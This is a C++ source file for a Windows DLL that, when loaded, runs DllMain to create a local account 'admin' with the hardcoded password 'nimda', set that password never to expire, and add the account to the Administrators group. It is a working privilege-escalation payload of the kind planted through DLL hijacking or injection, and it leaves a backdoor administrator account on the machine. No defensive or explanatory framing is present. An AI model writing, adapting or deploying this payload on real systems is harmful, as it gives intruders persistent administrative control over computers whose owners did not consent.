// addadmin.dll.cpp
#include <windows.h>
#include <lm.h>

#pragma comment(lib, "netapi32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        USER_INFO_1 ui;
        DWORD dwLevel = 1;
        DWORD dwError = 0;

        // Define username and password
        LPCWSTR username = L"admin";
        LPCWSTR password = L"nimda";

        // Set up the USER_INFO_1 structure
        ZeroMemory(&ui, sizeof(ui));
        ui.usri1_name = (LPWSTR)username;
        ui.usri1_password = (LPWSTR)password;
        ui.usri1_priv = USER_PRIV_USER;
        ui.usri1_home_dir = NULL;
        ui.usri1_comment = NULL;
        ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
        ui.usri1_script_path = NULL;

        // Create the user
        NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);

        // Add user to Administrators group
        LOCALGROUP_MEMBERS_INFO_3 account;
        account.lgrmi3_domainandname = (LPWSTR)username;
        NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
    }
    return TRUE;
}
